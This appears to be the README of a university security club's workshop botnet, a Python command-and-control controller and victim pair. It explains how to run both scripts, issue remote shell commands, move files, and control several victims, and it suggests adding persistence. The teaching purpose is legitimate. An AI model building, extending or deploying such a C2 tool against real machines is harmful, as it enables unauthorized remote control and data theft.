# Layer Zero Botnet
---
## Disclaimer
The code in this repository is intended for EDUCATIONAL purposes ONLY.
Please use this repository and information learned from this repository responsibly.
Layer Zero and the University of Nevada, Las Vegas are not responsible for irresponsible activity conducted using the code in this repository and information provided.

**FUTURE LAYER ZERO OFFICERS AND DEV TEAM: PLEASE DO NOT EDIT THE BASIC BOTNET FOLDER THIS IS A PROJECT FOR THE BOTNET WORKSHOP**
**TO MAKE ADDITIONS TO THE PROJECT PLEASE MAKE A COPY IN A NEW FOLDER TO WORK IN!**

## Basic Botnet

This is a simple command and control (C2) botnet demonstration consisting of two Python scripts:
- **`host.py`** - The controller/command center that manages victim connections
- **`victim.py`** - The client that connects to the host and executes commands

### Features
- Remote command execution
- File upload/download capabilities
- Multiple victim management
- Color-coded terminal output
- Interactive help menus
- Beginner-friendly comments

---

## How to Run (Same Device Testing)

### Prerequisites
- Python 3.x installed on your system
- Two terminal windows

### Step 1: Start the Host (Controller)

Open your first terminal and run:

```bash
cd botnet/botnet
python3 host.py
```

You should see:
```
 ____ ____ ____ ____ ____ _________ ____ ____ ____ ____ 
||L |||A |||Y |||E |||R |||       |||Z |||E |||R |||O ||
||__|||__|||__|||__|||__|||_______|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|

[+] Waiting for targets to connect...
[+] Type 'help' for a list of available commands
*Center: 
```

### Step 2: Start the Victim (Client)

Open a second terminal and run:

```bash
cd botnet/botnet
python3 victim.py
```

You should see:
```
 ____ ____ ____ ____ ____ _________ ____ ____ ____ ____ 
||L |||A |||Y |||E |||R |||       |||Z |||E |||R |||O ||
||__|||__|||__|||__|||__|||_______|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|

[+] Connecting to host...
[+] Connected! Awaiting commands...
```

The host terminal will show a connection message with the victim's details.

---

## Using the Command Center

### Main Commands (at `*Center:` prompt)

| Command | Description | Example |
|---------|-------------|---------|
| `help` | Display help menu | `help` |
| `targets` | List all connected victims | `targets` |
| `session <#>` | Connect to a specific victim | `session 0` |
| `sendall <cmd>` | Send command to ALL victims | `sendall whoami` |
| `quit` | Exit the program | `quit` |

### Example Session

```bash
*Center: help
# Shows the help menu with all available commands

*Center: targets
Session 0-----('127.0.0.1', 54088)

*Center: session 0
# Now you're controlling victim 0
Shell#: 
```

---

## Controlling a Victim (Shell Commands)

Once you enter a victim's shell (via `session <#>`), you can use these commands:

### Shell Commands (at `Shell#:` prompt)

| Command | Description | Example |
|---------|-------------|---------|
| `help` | Display shell help menu | `help` |
| `<any command>` | Run system commands | `ls`, `pwd`, `whoami`, `ps aux` |
| `cd <path>` | Change directory | `cd /tmp` |
| `download <file>` | Download file from victim | `download /etc/hosts` |
| `upload <file>` | Upload file to victim | `upload malware.txt` |
| `exit` | Return to Command Center | `exit` |

### Example Commands to Try

#### 1. Basic System Information
```bash
Shell#: whoami
# Shows the current user

Shell#: pwd
# Shows current directory

Shell#: hostname
# Shows the computer name

Shell#: uname -a
# Shows system information
```

#### 2. File System Navigation
```bash
Shell#: ls
# List files in current directory

Shell#: ls -la
# List all files with details

Shell#: cd /tmp
# Change to /tmp directory

Shell#: pwd
# Verify you're in /tmp
```

#### 3. Process Information
```bash
Shell#: ps aux
# Show all running processes

Shell#: top -l 1
# Show system activity (macOS)
```

#### 4. Network Information
```bash
Shell#: ifconfig
# Show network interfaces

Shell#: netstat -an
# Show network connections
```

#### 5. File Operations
```bash
Shell#: cat /etc/hosts
# Display contents of a file

Shell#: download /etc/hosts
# Download the hosts file to your computer

Shell#: upload test.txt
# Upload test.txt from your computer to victim
```

#### 6. Creating Files
```bash
Shell#: echo "Hello from botnet" > test.txt
# Create a test file

Shell#: cat test.txt
# Verify file contents
```

---

## Example Full Workflow

```bash
# Terminal 1 (Host)
python3 host.py

*Center: targets
Session 0-----('127.0.0.1', 54088)

*Center: session 0
Shell#: whoami
your_username

Shell#: pwd
/path/to/botnet/botnet

Shell#: ls
host.py
victim.py

Shell#: cd /tmp
Shell#: pwd
/tmp

Shell#: echo "Botnet test" > botnet_test.txt
Shell#: cat botnet_test.txt
Botnet test

Shell#: download botnet_test.txt
# File is now downloaded to your current directory

Shell#: exit
*Center: quit
```

---

## Testing Multiple Victims

To test with multiple victims on the same machine:

1. Start `host.py` in one terminal
2. Start multiple instances of `victim.py` in separate terminals
3. Use `targets` to see all connected victims
4. Use `session <#>` to control each one individually

---

## Network Configuration

### Running on Same Device (Testing)
- Host listens on: `0.0.0.0:4444`
- Victim connects to: `127.0.0.1:4444`

### Running on Different Devices (Real Network)
1. Find your host computer's IP address:
   ```bash
   ifconfig  # macOS/Linux
   ipconfig  # Windows
   ```
2. Update `victim.py` line 184 to use your host's actual IP:
   ```python
   server('YOUR_HOST_IP', 4444)  # Instead of '127.0.0.1'
   ```
3. Ensure port 4444 is open in your firewall

---

## Troubleshooting

### "Can't assign requested address"
- Make sure the host is binding to `0.0.0.0` (not a specific IP)

### "Connection refused"
- Make sure the host is running BEFORE starting the victim
- Check that port 4444 is not blocked by firewall
- Verify the IP address is correct

### Victim won't connect
- Ensure both programs are using the same port (4444)
- Check firewall settings
- Verify network connectivity between machines

---

## Further Considerations

### Potential Improvements
- Add encryption (TLS/SSL) for secure communication
- Implement authentication to verify victim identity
- Add persistence mechanisms
- Implement more advanced command handling
- Add logging and monitoring features
- Create a GUI for easier control

### Learning Resources
- Study network programming and socket communication
- Learn about cybersecurity and penetration testing
- Understand operating system internals
- Research malware analysis techniques
- Explore ethical hacking practices

---

## License

See LICENSE file for details.

## Credits

Created by Layer Zero @ University of Nevada, Las Vegas